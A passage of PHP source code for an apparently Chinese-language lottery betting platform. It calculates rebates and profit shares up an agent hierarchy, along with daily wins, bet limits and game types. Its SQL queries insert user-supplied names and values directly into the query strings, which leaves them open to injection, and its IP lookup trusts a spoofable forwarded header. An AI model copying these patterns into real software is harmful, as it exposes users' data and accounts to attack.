		$RankUser = RankUser ($db, $value);
		$floorMoney = floorMoney($user, $types, $ball, $RankUser, $p,$sz,$kl8,$k5);
		$DtnArray['tueishui_4'] = $floorMoney; //公司退水
	}
		return $DtnArray;
}


function SumRankDistributiongx ($user, $money, $ball, $types, $p=false)
{
	$DtnArray = array('tueishui_1'=>0, 'tueishui_2'=>0, 'tueishui_3'=>0, 'tueishui_4'=>0, 'distribution_1'=>0, 'distribution_2'=>0, 'distribution_3'=>0, 'distribution_4'=>0);
	$db = new DB();
	//得到直屬上級
	$RankUser = RankUser($db, $user[0]['g_nid']);
	if ($user[0]['g_mumber_type'] == 2)
	{
		$nid = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-32);
		$RankUser = RankUser ($db, $nid);
		//判斷屬於什麽級別的直屬會員
		switch ($RankUser[0]['g_login_id'])
		{
			case 56: //股東直屬
				$floorMoney = floorMoneygx($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_4'] = $floorMoney; //分公司退水
				$DtnArray['distribution_4'] = $user[0]['g_distribution'];
				if($RankUser[0]['g_zcgs']==0){
				$DtnArray['distribution_4'] =$RankUser[0]['g_distribution_limit']; //公司占成
				}				
			break;
			case 22: //股東直屬
				$floorMoney = floorMoneygx($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_3'] = $floorMoney; //股東退水
				$DtnArray['distribution_3'] = $user[0]['g_distribution'];
				if($RankUser[0]['g_zcgs']==0){
				$DtnArray['distribution_4'] =($RankUser[0]['g_distribution_limit']+$RankUser[0]['g_distribution']) - $DtnArray['distribution_3']; //公司占成
				}else{
				$DtnArray['distribution_4']=$RankUser[0]['g_distribution_limit'];
				}
				//繼續查詢上級
				$value = mb_substr($nid, 0, mb_strlen($nid)-32);
				$RankUser = RankUser($db, $value);
				$floorMoney = floorMoneygx($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_4'] = $floorMoney; //公司退水
			break;
			case 78: //總代理直屬
				//退水百分比
				$floorMoney = floorMoneygx($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_2'] = $floorMoney; //總代理退水
				$DtnArray['distribution_2'] = $user[0]['g_distribution']; //總代理占成
				$DtnArray['distribution_3'] = $RankUser[0]['g_distribution_limit']; //股東占成
				
				//繼續查詢上級
				$value = mb_substr($nid, 0, mb_strlen($nid)-32);
				$RankUser = RankUser($db, $value);
				$floorMoney = floorMoneygx ($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_3'] = $floorMoney; //股東退水
				if($RankUser[0]['g_zcgs']==0){
				$g_distri=100-($RankUser[0]['g_distribution_limit']+$RankUser[0]['g_distribution']);
				$DtnArray['distribution_4'] = 100 - ($DtnArray['distribution_3'] + $DtnArray['distribution_2']+$g_distri); //公司占成
				}else{
				$DtnArray['distribution_4']=$RankUser[0]['g_distribution_limit'];
				}
				//繼續查詢上級
				$value = mb_substr($nid, 0, mb_strlen($nid)-64);
				$RankUser = RankUser($db, $value);
				$floorMoney = floorMoneygx ($user, $types, $ball, $RankUser, $p);
				$DtnArray['tueishui_4'] = $floorMoney; //公司退水
			break;
		}
	}
	else 
	{
		//退水百分比
		$floorMoney = floorMoneygx($user, $types, $ball, $RankUser, $p);
		$DtnArray['tueishui_1'] = $floorMoney; //代理退水
		$DtnArray['distribution_1'] = $user[0]['g_distribution']; //代理占成
		$DtnArray['distribution_2'] = $RankUser[0]['g_distribution_limit']; //總代理占成
		//繼續查詢上級
		$value = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-32);
		$RankUser = RankUser ($db, $value);
		$floorMoney = floorMoneygx($user, $types, $ball, $RankUser, $p);
		$DtnArray['tueishui_2'] = $floorMoney; //總代理退水
		$DtnArray['distribution_3'] = $RankUser[0]['g_distribution_limit']; //股東占成
		//繼續查詢上級
		$value = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-64);
		$RankUser = RankUser ($db, $value);
		$floorMoney = floorMoneygx($user, $types, $ball, $RankUser, $p);
		$DtnArray['tueishui_3'] = $floorMoney; //股東退水
		if($RankUser[0]['g_zcgs']==0){
		$g_distri=100-($RankUser[0]['g_distribution_limit']+$RankUser[0]['g_distribution']);
		$DtnArray['distribution_4'] =100 - ($DtnArray['distribution_1'] + $DtnArray['distribution_2'] + $DtnArray['distribution_3']+$g_distri); //公司占成
		}else{
		$DtnArray['distribution_4']=$RankUser[0]['g_distribution_limit'];
		}
		//繼續查詢上級
		$value = mb_substr($user[0]['g_nid'], 0, mb_strlen($user[0]['g_nid'])-96);
		$RankUser = RankUser ($db, $value);
		$floorMoney = floorMoneygx($user, $types, $ball, $RankUser, $p);
		$DtnArray['tueishui_4'] = $floorMoney; //公司退水
	}
		return $DtnArray;
}
/**
 * 获取当前用户今天输赢
 * Enter description here ...
 * @param unknown_type $user
 */
function getWin ($user, $p=false)
{
	/*$startDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')-1, date('Y'))).' 06:10';
	$endDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')+1, date('Y'))).' 06:10';*/
	$a = day();
	$startDate = $a[0];
	$endDate = $a[1];
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	$db = new DB();
	$count = 0;
	if ($p==false && Copyright) {
		$sql = "SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win`, `g_t_id` FROM `g_zhudan` WHERE {$date} AND `g_nid` = '{$user[0]['g_name']}' AND `g_win` is not null ";
	} else {
		$sql = "SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win`, `g_t_id` FROM `g_zhudan` WHERE {$date} AND `g_s_nid` LIKE '{$user[0]['g_nid']}%' AND `g_win` is not null ";
	}

	$result = $db->query($sql, 1);
	if ($result)
	{
		for ($i=0; $i<count($result); $i++)
		{
			$countMoney = sumCountMoney ($user, $result[$i]);
			$count += $countMoney['Win'];
		}
	}
	return $count;
}
 
/**
 * 得到注單記錄
 * 返回總數
 * Enter description here ...
 * @param model $user 用戶
 * @param bool $bool TRUE = 所有未結算注單   FALSE = 所有已結算注單
 */
function getwinResultIsNull ($user, $bool=TRUE)
{
	$db = new DB();
	$countNum =array(0=>0, 1=>0, 2=>0, 3=>0);
	$where = $bool ? "`g_win` is null" : "`g_win` is not null";
	$sql1 = "SELECT * FROM `g_zhudan` WHERE `g_nid` = '{$user[0]['g_name']}' AND {$where} ";
	$results = $db->query($sql1, 1);
	if ($results)
	{
		for ($i=0; $i<count($results); $i++)
		{
			$countNum[0] = $i+1;
			$countNum[1] += $results[$i]['g_jiner'];
			//結算后總金額
			if ($results[$i]['g_win'] && Copyright)
				$countNum[3] += $results[$i]['g_win'] >0 ? $results[$i]['g_win'] - $results[$i]['g_jiner'] : $results[$i]['g_win'];
			if ($results[$i]['g_mingxi_1_str'] == null && Copyright) 
			{
				//總下注金額
				$countNum[2] +=$results[$i]['g_odds'] * $results[$i]['g_jiner'] - $results[$i]['g_jiner'];
			}
			else 
			{
				$zCount = $results[$i]['g_mingxi_1_str'];
	        	$_xMoney = $zCount * $results[$i]['g_jiner'];
	        	$countNum[2] += $_xMoney * $results[$i]['g_odds'] - $_xMoney;
			}
		}
	}
	return $countNum;
}

/**
 * 退水換算
 * @param unknown_type $money
 * @param unknown_type $tuiSui
 */
function sumTuiSui ($result, $p=null)
{
	switch ($p) 
	{
		case 22 : //直屬分公司
			$a = (100 -$result['g_tueishui_3']) /100; 
			break;
		case 78 : //直屬股東
			$a = (100 -$result['g_tueishui_2']) /100; 
			break;
		case 48 : //直屬總代理
			$a = (100 -$result['g_tueishui_1']) /100;
			break;
		case 9 : //會員退
			$a = (100 -$result['g_tueishui']) /100; 
			break;
		default: $a=(100 -$result['g_tueishui']) /100; 
	}
	return $a;
}

function sumCountMoney ($user, $results, $LM=FALSE)
{
	$countMoney =array('Num'=>0, 'Money'=>0, 'TuiShui'=>0, 'Win'=>0);
	if ($results)
	{
		$countMoney['Num'] = 1;
		$sWin = $results['g_win'];
		$sMoney = $results['g_jiner'];
		$sOdds = $results['g_odds'];
		$tueishui = sumTuiSui ($results);
		if ($results['g_mingxi_1_str'] == null && Copyright)
		{
			$countMoney['Money'] = $sMoney;
			if ($results['g_win'] != '0'){
				$tueishui = $sMoney * $tueishui;
				$countMoney['TuiShui'] = $tueishui;
				if ($sWin && Copyright)
					//結算后總金額
					$countMoney['Win'] = $sWin;// >0 ? $sWin - $sMoney : $sWin;
				else
					$countMoney['Win'] = ($sOdds * $sMoney - $sMoney) + $tueishui;
			}
		}
		else 
		{
			//連碼下注總金額
			$countMoney['Money'] = $results['g_mingxi_1_str'] * $results['g_jiner'];
			if ($results['g_mingxi_2_str']){ //已中注碼情況下計算
				$_c = $results['g_mingxi_1_str'] * $sMoney;
				$c = $results['g_mingxi_2_str'] * $sMoney;
				$tueishui = $_c * $tueishui;
				$c = ($c * $results['g_odds'] - $_c) + $tueishui;
			} else {
				$c = $results['g_mingxi_1_str'] * $sMoney;
	        	$tueishui = $c * $tueishui;
				if ($LM == true && Copyright) {
	        		$c = ($c * $results['g_odds'] - $c) + $tueishui;
				} else {
					$c = -$c + $tueishui;
				}
			}
			$countMoney['TuiShui'] = $tueishui;
			$countMoney['Win'] = $c;
		}
	}
	return $countMoney;
}

function days($a, $c){
	$time = date('H:i:s');
	if ($time > '00:00:00' && $time < '06:10:00' && Copyright){
		$y = 0;
		$day = date('Y-m-d',strtotime("$a -1 day"));
	} else {
		$day = date( $a);
		$y = 1;
	}
	$startDate = $day.' 06:10';
	$endDate = date('Y-m-d',strtotime("$c +{$y} day")).' 06:10';
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	return $date;
}

function day(){
	$time = date('H:i:s');
	$d = date('Y-m-d');
	if ($time > '00:00:00' && $time < '06:10:00' && Copyright){
		$y = 0;
		$day = date("Y-m-d", mktime(0,0,0,date('m'),date('d')-1,date('Y')));
	} else if ($time > '06:10:00' && Copyright){
		$day = date("Y-m-d");
		$y = 1;
	}
	$startDate = $day.' 06:10';
	$endDate = date('Y-m-d',strtotime("{$y} day")).' 06:10';
	return array(0=>$startDate, 1=>$endDate);
}

/**
 * 返回連碼玩法類型和復式循環次數
 * Enter description here ...
 * @param string $string
 * @return Array
 */
function GetGameType ($string)
{
	$stringList = array();
	switch ($string)
	{
		case "t1" : $stringList['type'] = '任選二'; 		$stringList['count'] = 2; break;
		case "t2" : $stringList['type'] = '選二連直'; 	$stringList['count'] = 2; break;
		case "t3" : $stringList['type'] = '選二連組'; 	$stringList['count'] = 2; break;
		case "t4" : $stringList['type'] = '任選三'; 		$stringList['count'] = 3; break;
		case "t5" : $stringList['type'] = '選三前直'; 	$stringList['count'] = 3; break;
		case "t6" : $stringList['type'] = '選三前組'; 	$stringList['count'] = 3; break;
		case "t7" : $stringList['type'] = '任選四'; 		$stringList['count'] = 4; break;
		case "t8" : $stringList['type'] = '任選五'; 		$stringList['count'] = 5; break;
		default:exit('is t1 or t8 Error');
	}
	return $stringList;
}
function GetGameType_gx ($string)
{
	$stringList = array();
	switch ($string)
	{
		case "t1" : $stringList['type'] = '一中一'; 		$stringList['count'] = 1; break;
		case "t2" : $stringList['type'] = '二中二'; 	$stringList['count'] = 2; break;
		case "t3" : $stringList['type'] = '二中二'; 	$stringList['count'] = 2; break;
		case "t4" : $stringList['type'] = '三中二'; 		$stringList['count'] = 3; break;
		case "t5" : $stringList['type'] = '選三前直'; 	$stringList['count'] = 3; break;
		case "t6" : $stringList['type'] = '三中三'; 	$stringList['count'] = 3; break;
		case "t7" : $stringList['type'] = '四中三'; 		$stringList['count'] = 4; break;
		case "t8" : $stringList['type'] = '五中三'; 		$stringList['count'] = 5; break;
		default:exit('is t1 or t8 Error');
	}
	return $stringList;
}

/**
 * 返回當前用戶、單注限額、單號限額、單號已下、 單期限額、單期已下
 * @param Array $result  當前用戶的限額列表
 * @param Array $user 當前用戶
 * @return Array
 */
function GetUser_s ($result, $user,$types,$ball, $p=false,$k5=false)
{
//	if(is_numeric($ball))
//	$g_mingxi2="and   g_mingxi_2 in('0','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','1','2','3','4','5','6','7','8','9');";
//	else
	$g_mingxi2=" and g_mingxi_2='{$ball}' ";
	$db = new DB();
	//獲取正在開盤中的期數
	$from = ($k5?"g_kaipan3":($p ? "g_kaipan2" : "g_kaipan"));
	$ber = $db->query("SELECT `g_qishu` FROM {$from} WHERE `g_lock` = 2 LIMIT 1 ", 0);
	//獲取單期當天下注總數
	$count = 0;
	$results = $db->query("SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win` FROM `g_zhudan` 
	WHERE `g_qishu` = '{$ber[0][0]}' AND `g_nid` = '{$user[0]['g_name']}'  and g_mingxi_1='{$types}' ".$g_mingxi2, 1);
	if ($results)
	{
		for ($i=0; $i<count($results); $i++)
		{
			$countMoney = sumCountMoney ($user, $results[$i]);
			$count += $countMoney['Money'];
		}
	}
	$max['DanZhu_XianEr'] = $result[0]['g_danzhu']; //單注限額
	$max['DanHao_XianE'] = $user[0]['g_xianer']; //單號限額
	$max['DanHao_YiXia'] = GetUser_h ($user); //單號已下
	$max['DanQi_XianEr'] = $result[0]['g_danxiang']; //單期限額
	$max['DanQi_YiXia'] = $count; //單期已下
	$max['KeYongEr'] = $user[0]['g_money_yes']; //可用額
	return $max;
}

function GetUser_s_ot ($result, $user,$types,$ball, $gameid)
{
//	if(is_numeric($ball))
//	$g_mingxi2="and   g_mingxi_2 in('0','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','1','2','3','4','5','6','7','8','9');";
//	else
	$g_mingxi2=" and g_mingxi_2='{$ball}' ";
	$db = new DB();
	//獲取正在開盤中的期數
	if($gameid==1 ) $from = "g_kaipan";
	else $from = "g_kaipan".$gameid;
	$ber = $db->query("SELECT `g_qishu` FROM {$from} WHERE `g_lock` = 2 LIMIT 1 ", 0);
	//獲取單期當天下注總數
	$count = 0;
	$results = $db->query("SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win` FROM `g_zhudan` 
	WHERE `g_qishu` = '{$ber[0][0]}' AND `g_nid` = '{$user[0]['g_name']}'  and g_mingxi_1='{$types}' ".$g_mingxi2, 1);
	if ($results)
	{
		for ($i=0; $i<count($results); $i++)
		{
			$countMoney = sumCountMoney ($user, $results[$i]);
			$count += $countMoney['Money'];
		}
	}
	$max['DanZhu_XianEr'] = $result[0]['g_danzhu']; //單注限額
	$max['DanHao_XianE'] = $user[0]['g_xianer']; //單號限額
	$max['DanHao_YiXia'] = GetUser_h ($user); //單號已下
	$max['DanQi_XianEr'] = $result[0]['g_danxiang']; //單期限額
	$max['DanQi_YiXia'] = $count; //單期已下
	$max['KeYongEr'] = $user[0]['g_money_yes']; //可用額
	return $max;
}

/**
 * 得到當前用戶今天的總下注額
 * Enter description here ...
 * @param Model $user
 */
function GetUser_h ($user)
{
	$db = new DB();
	/*$startDate = date('Y-m-d').' 00:00';
	$endDate = date('Y-m-d').' 24:00';*/
	$a = day();
	$startDate = $a[0];
	$endDate = $a[1];
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	$count = 0;
	$result = $db->query("SELECT * FROM `g_zhudan` WHERE {$date} AND `g_nid` = '{$user[0]['g_name']}' ", 1);
	if ($result)
	{
		for ($i=0; $i<count($result); $i++)
		{
			$countMoney = sumCountMoney ($user, $result[$i]);
			$count += $countMoney['Money'];
		}
	}
	return $count;
}
//得到未結算注單
function User_null ($user)
{
	$db = new DB();
	$a = day();
	$startDate = $a[0];
	$endDate = $a[1];
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	$count = 0;
	$result = $db->query("SELECT sum(g_jiner) as sum_m FROM `g_zhudan` WHERE {$date} AND `g_nid` = '{$user}' and g_win IS NULL  ", 1);
	if($result[0]['sum_m']!=""){
	$sum_momey=$result[0]['sum_m'];
	}else{
	$sum_momey=0;
	}
	return $sum_momey;
}



/**
 * 得到用戶今天盈亏
 * Enter description here ...
 * @param unknown_type $user
 */
function gettdwin ($user)
{
	/*$startDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')-1, date('Y'))).' 06:10';
	$endDate = date( "Y-m-d ", mktime(0, 0, 0, date('m'), date('d')+1, date('Y'))).' 06:10';*/
	$a = day();
	$startDate = $a[0];
	$endDate = $a[1];
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	$db = new DB();
	$count = 0;

		$sql = "SELECT `g_id`, `g_s_nid`, `g_mumber_type`, `g_nid`, `g_date`, `g_type`, `g_qishu`, `g_mingxi_1`, `g_mingxi_1_str`, `g_mingxi_2`, `g_mingxi_2_str`, `g_odds`, `g_jiner`, `g_tueishui`, `g_tueishui_1`, `g_tueishui_2`, `g_tueishui_3`, `g_tueishui_4`, `g_distribution`, `g_distribution_1`, `g_distribution_2`, `g_distribution_3`, `g_win`, `g_t_id` FROM `g_zhudan` WHERE {$date} AND `g_nid` = '{$user}' AND `g_win` is not null ";
	
	$result = $db->query($sql, 1);
	if ($result)
	{
		for ($i=0; $i<count($result); $i++)
		{
			$countMoney = sumCountMoney ($user, $result[$i]);
			$count += $countMoney['Win'];
		}
	}
	return $count;
}
/**
 * 得到用戶g_nid
 * Enter description here ...
 * @param unknown_type $user
 */
function getgnid ($user)
{
	
	$db = new DB();
	$sql = "SELECT `g_nid` FROM `g_rank` WHERE g_name='{$user}' ";
	$guserdd = $db->query($sql, 1);
	$getgnid = $guserdd[0]['g_nid'];
	return $getgnid;
  
}
/**
 * 得到用戶可用額
 * Enter description here ...
 * @param unknown_type $user
 */
function GetUser_KY_Count ($user)
{
	/*計算今天用戶的可用額
	 * 未結算下注金額 + 總輸贏 = 可用金額
	 */
	$db = new DB();
	/*$startDate = date('Y-m-d').' 00:00';
	$endDate = date('Y-m-d').' 24:00';*/
	$a = day();
	$startDate = $a[0];
	$endDate = $a[1];
	$date = " `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' ";
	//echo "SELECT SUM(g_jiner) AS COUNT FROM `g_zhudan` WHERE {$date} AND `g_nid` = '{$user}' AND g_win is null ";
	$isNullCount = $db->query("SELECT SUM((case when g_mingxi_1_str<>'' then (g_mingxi_1_str*g_jiner) else g_jiner end)) AS COUNT FROM `g_zhudan` WHERE {$date} AND `g_nid` = '{$user}' AND g_win is null ", 0);
	$isNullCount = $isNullCount[0][0] == false ? 0 : $isNullCount[0][0];
	$countWin = $db->query("SELECT SUM(g_win) AS COUNT FROM `g_zhudan` WHERE {$date} AND `g_nid` = '{$user}' AND g_win is not null ", 0);
	$countWin = $countWin[0][0] == false ? 0 : $countWin[0][0];
	$sql = "SELECT `g_money` FROM `g_user` WHERE `g_name` = '{$user}' LIMIT 1 ";
	$userdd = $db->query($sql, 1);
	$sCount = ($userdd[0]['g_money'] - $isNullCount) + $countWin;
	return $sCount;
}

function GetForms ($startDate, $endDate, $name=null,$type=0)
{
	if($type==0)
	$g_type=" ";
	if($type==1)
	$g_type=" and g_type='廣東快樂十分' ";
	if($type==2)
	$g_type=" and g_type='重慶時時彩' ";
	if($type==3)
	$g_type=" and g_type='廣西快樂十分' ";
	if($type==6)
	$g_type=" and g_type='北京赛车PK10' ";
	//		alert($type);
	$adn = $name == null ? "" : " AND `g_nid` = '{$name}' ";
	$db = new DB();
	$sql = "SELECT * FROM `g_zhudan` WHERE `g_date` > '{$startDate}' AND `g_date` < '{$endDate}' {$adn} AND g_win is not null {$g_type} ";
	//echo $sql;
	return $db->query($sql, 1);
}

/**
 * 返回個遊戲玩法的退水列表
 * Enter description here ...
 * @param unknown_type $t //遊戲玩法
 * @param unknown_type $ball //號碼
 * @param unknown_type $name //當前用戶帳號
 */
function GetUserXianEr ($t, $ball=null, $name,$gameid=1)
{
	$type = _getString ($t, $ball);
	$db = new DB();
	$sql = "SELECT `g_id`, `g_nid`, `g_type`, `g_panlu_a`,`g_panlu_b`,`g_panlu_c`, `g_danzhu`, `g_danxiang` FROM `g_panbiao` WHERE `g_nid` = '{$name}' AND `g_type` = '{$type}' AND `g_game_id` ={$gameid} LIMIT 1  ";
	//echo $sql;
	return $db->query($sql, 1);
}
function GetUserXianErcq ($type, $name,$gametype=2)
{
	$db = new DB();
	$sql = "SELECT `g_id`, `g_nid`, `g_type`, `g_panlu_a`,`g_panlu_b`,`g_panlu_c`, `g_danzhu`, `g_danxiang` FROM `g_panbiao` WHERE `g_nid` = '{$name}' AND `g_type` = '{$type}' AND `g_game_id` =".$gametype." LIMIT 1  ";
	return $db->query($sql, 1);
}
function GetUserXianErsz ($type, $name)
{
	$db = new DB();
	$sql = "SELECT `g_id`, `g_nid`, `g_type`, `g_panlu_a`,`g_panlu_b`,`g_panlu_c`, `g_danzhu`, `g_danxiang` FROM `g_panbiao` WHERE `g_nid` = '{$name}' AND `g_type` = '{$type}' AND `g_game_id` =7 LIMIT 1  ";
	return $db->query($sql, 1);
}
function GetUserXianErkl8 ($type, $name)
{
	$db = new DB();
	$sql = "SELECT `g_id`, `g_nid`, `g_type`, `g_panlu_a`,`g_panlu_b`,`g_panlu_c`, `g_danzhu`, `g_danxiang` FROM `g_panbiao` WHERE `g_nid` = '{$name}' AND `g_type` = '{$type}' AND `g_game_id` =8 LIMIT 1  ";

	return $db->query($sql, 1);
}
/**
 * 取代理以上退水盤
 * Enter description here ...
 * @param unknown_type $t //遊戲玩法
 * @param unknown_type $ball //號碼
 * @param unknown_type $name //當前用戶帳號
 * @param unknown_type $pan 盤口 g_a_limit
 */
function GetRankXianEr ($t, $ball=null, $name, $pan)
{
	$type = _getString ($t, $ball);
	$db = new DB();
	$sql = "SELECT `g_type`,  `$pan`  FROM `g_send_back` WHERE `g_name` = '{$name}' AND `g_type` = '{$type}' AND `g_game_id` = 1  LIMIT 1  ";
	return $db->query($sql, 0);
}

function GetRankXianErgx ($t, $ball=null, $name, $pan)
{
	$type = _getStringgx ($t, $ball);
	$db = new DB();
	$sql = "SELECT `g_type`,  `$pan`  FROM `g_send_back` WHERE `g_name` = '{$name}' AND `g_type` = '{$type}' AND `g_game_id` = 3  LIMIT 1  ";
	return $db->query($sql, 0);
}
function GetRankXianErcq ($t, $name, $pan,$gametype=2)
{
	$db = new DB();
	$sql = "SELECT `g_type`,  `$pan`  FROM `g_send_back` WHERE `g_name` = '{$name}' AND `g_type` = '{$t}' AND `g_game_id` = ".$gametype."  LIMIT 1  ";
	return $db->query($sql, 0);
}

function GetRankXianErkl8 ($t, $name, $pan)
{
	$db = new DB();
	$sql = "SELECT `g_type`,  `$pan`  FROM `g_send_back` WHERE `g_name` = '{$name}' AND `g_type` = '{$t}' AND `g_game_id` = 8  LIMIT 1  ";
	return $db->query($sql, 0);
}
function GetRankXianErsz ($t, $name, $pan)
{
	$db = new DB();
	if($t=="圍骰" || $t=="全骰")
		$t='圍骰全骰';
	$sql = "SELECT `g_type`,  `$pan`  FROM `g_send_back` WHERE `g_name` = '{$name}' AND `g_type` = '{$t}' AND `g_game_id` = 7  LIMIT 1  ";
	return $db->query($sql, 0);
}

function GetUserXianErjsk3($types,$g_ball,$name,$pan){
	$type = _getStringjsk3 ($types,$g_ball);
	$db = new DB();
	$sql = "SELECT `g_type`,  `g_danzhu`, `g_danxiang` FROM `g_panbiao` WHERE `g_nid` = '{$name}' AND `g_type` = '{$type}' AND `g_game_id` = 7  LIMIT 1  ";
	return $db->query($sql, 1);
}
function _getStringjsk3($g_ball,$h){ 
	$h=substr($h,1);//只保留數字
	if($g_ball=="Ball_1"){
		if($h>=1 && $h<=6){
			return '三军';
		}else {
			return '大小';
		}
	}else if($g_ball=="Ball_2"){ 
		
			return '大小'; 
	
	}else if($g_ball=="Ball_3"){ 

			return '圍骰全骰';

	}else if($g_ball=="Ball_4"){
		return '點數'; 
	}else if($g_ball=="Ball_5"){
		return '長牌';
	}else if($g_ball=="Ball_6"){
		return '短牌';
	} 
}


function GetIP()
{
	// 初始化一个变量$realip
    static $realip = NULL;

    // 如果$realip不真等于NULL,返回之
    if ($realip !== NULL)
    {
        return $realip;
    }
// 如果$_SERVER有值
    if (isset($_SERVER))
    {
    // 如果$_SERVER['HTTP_X_FORWARDED_FOR']有值
    // 表明客户端通过代理上网
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        {
        // 使用explode()函数将其用','分割成数组
            $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);

            /* 取X-Forwarded-For中第一个非unknown的有效IP字符串 */
            // 开始遍历数组
            foreach ($arr AS $ip)
            {
            // 去掉首尾的空白
                $ip = trim($ip);
     // 不是unknown就是真实上网地址,存值并退出循环
                if ($ip != 'unknown')
                {
                    $realip = $ip;
                    break;
                }
            }
        }
        // $_SERVER['HTTP_X_FORWARDED_FOR']无值 且
        // $_SERVER['HTTP_CLIENT_IP']有值，取其值作为真实IP
        elseif (isset($_SERVER['HTTP_CLIENT_IP']))
        {
            $realip = $_SERVER['HTTP_CLIENT_IP'];
        }
        // $_SERVER['HTTP_X_FORWARDED_FOR']无值(不是用过代理上网)并且
        // $_SERVER['HTTP_CLIENT_IP']也没有值
        else
        {
        // 如果$_SERVER['REMOTE_ADDR']有值，取其值作为真实IP
            if (isset($_SERVER['REMOTE_ADDR']))
            {
                $realip = $_SERVER['REMOTE_ADDR'];
            }
            else // 都没有值返回'0.0.0.0'
            {
                $realip = '0.0.0.0';
            }
        }
    }
    // $_SERVER没有值
    else 
    {
    // 如果getenv('HTTP_X_FORWARDED_FOR')非空取其值作为真实IP
        if (getenv('HTTP_X_FORWARDED_FOR'))
        {
            $realip = getenv('HTTP_X_FORWARDED_FOR');
        }
        // 如果getenv('HTTP_CLIENT_IP')非空取其值作为真实IP
        elseif (getenv('HTTP_CLIENT_IP'))
        {
            $realip = getenv('HTTP_CLIENT_IP');
        }
        // 否则取getenv('REMOTE_ADDR')的值作为真实IP
        else
        {
            $realip = getenv('REMOTE_ADDR');
        }
    }

    preg_match("/[\d\.]{7,15}/", $realip, $onlineip);
    $realip = !empty($onlineip[0]) ? $onlineip[0] : '0.0.0.0';

    return $realip;

}

/**
 * 返回用戶的退水查詢名稱
 * Enter description here ...
 * @param unknown_type $t
 * @param unknown_type $ball
 */
function _getString ($t, $ball=null)
{

	if ($t == "第一球" || $t == "第二球" || $t == "第三球" || $t == "第四球" || $t == "第五球" || $t == "第六球" || $t == "第七球" || $t == "第八球")
	{
		if (is_numeric($ball)&&(int)$ball <= 20 && Copyright)
		{
			//讀取1-20號碼的限額
			$type = $t;
		}
		else 
		{
			if ($ball == '大' || $ball == '小')
				$type = '1-8大小';
			else if ($ball == '單' || $ball == '雙')
				$type = '1-8單雙';
			else if ($ball == '尾大' || $ball == '尾小')
				$type = '1-8尾數大小';
			else if ($ball == '合數單' || $ball == '合數雙')
				$type = '1-8合數單雙';
			else if ($ball == '東' || $ball == '南' || $ball == '西' || $ball == '北')
				$type = '1-8方位';
			else if ($ball == '中' || $ball == '發' || $ball == '白')
				$type = '1-8中發白';
		}
	}
	else if ($t == "總和、龍虎")
	{
		if ($ball == '總和大' || $ball == '總和小')
			$type = '總和大小';
		else if ($ball == '總和單' || $ball == '總和雙')
			$type = '總和單雙';
		else if ($ball == '總和尾大' || $ball == '總和尾小')
			$type = '總和尾數大小';
		else if ($ball == '龍' || $ball == '虎')
			$type = '龍虎';
	}
	else if ($t == '任選二' || $t == '選二連直' || $t == '選二連組' || $t == '任選三' || $t == '選三前直' || $t == '選三前組' || $t == '任選四' || $t == '任選五')
		$type = $t;
	return $type;
}
function _getStringgx ($t, $ball=NULL)
{
	if ($t == "第一球" || $t == "第二球" || $t == "第三球" || $t == "第四球" || $t == "特码" || $t == "第六球" || $t == "第七球" || $t == "第八球")
	{
		if ((int)$ball <= 21 && Copyright)
		{
			//讀取1-20號碼的限額
			$type = $t;
		}else 
		{
			if ($ball == '大' || $ball == '小')
				$type = '1-5大小';
			else if ($ball == '單' || $ball == '雙')
				$type = '1-5單雙';
			else if ($ball == '尾大' || $ball == '尾小')
				$type = '1-5尾數大小';
			else if ($ball == '合數單' || $ball == '合數雙')
				$type = '1-5合數單雙';
			else if ($ball == '神' || $ball == '奇' || $ball == '快' || $ball == '乐')
